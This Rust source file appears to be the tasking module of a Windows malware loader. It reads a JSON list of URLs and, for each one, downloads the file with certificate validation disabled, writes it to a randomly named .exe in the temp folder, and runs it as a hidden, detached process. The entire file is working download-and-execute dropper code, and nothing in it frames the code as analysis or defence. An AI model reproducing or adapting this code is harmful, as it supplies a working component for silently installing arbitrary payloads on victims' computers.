use rand::RngExt;
use serde::Deserialize;
use std::fs::File;
use std::io::copy;
use std::os::windows::process::CommandExt;
use std::process::Command;
use std::env;
use std::thread;
use rand::distr::Alphanumeric;

const DETACHED_PROCESS: u32 = 0x00000008;
const CREATE_NEW_PROCESS_GROUP: u32 = 0x00000200;
const CREATE_NO_WINDOW: u32 = 0x00000800;

#[derive(Debug, Deserialize)]
struct Task {
    url: String,
}

fn spawn_detached(path: &std::path::PathBuf) {
    let _ = Command::new(path)
        .creation_flags(DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW)
        .spawn();
}

fn download_execute(url: String) {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();

    let mut response = match client.get(&url).send() {
        Ok(res) => res,
        Err(_) => return,
    };

    let rand_string: String = rand::rng()
        .sample_iter(&Alphanumeric)
        .take(16)
        .map(char::from)
        .collect();

    let mut temp_path = env::temp_dir();
    temp_path.push(format!("{}.exe", rand_string));

    let mut dest = match File::create(&temp_path) {
        Ok(file) => file,
        Err(_) => return,
    };

    if copy(&mut response, &mut dest).is_ok() {
        drop(dest);

        spawn_detached(&temp_path);
    }
}

pub fn parse_tasks_and_exec(tasks_json: String) {
    let parsed_tasks: Vec<Task> = match serde_json::from_str(&tasks_json) {
        Ok(t) => t,
        Err(_) => return,
    };

    for task in parsed_tasks {
        let url = task.url.clone();

        thread::spawn(move || {
            download_execute(url);
        });
    }
}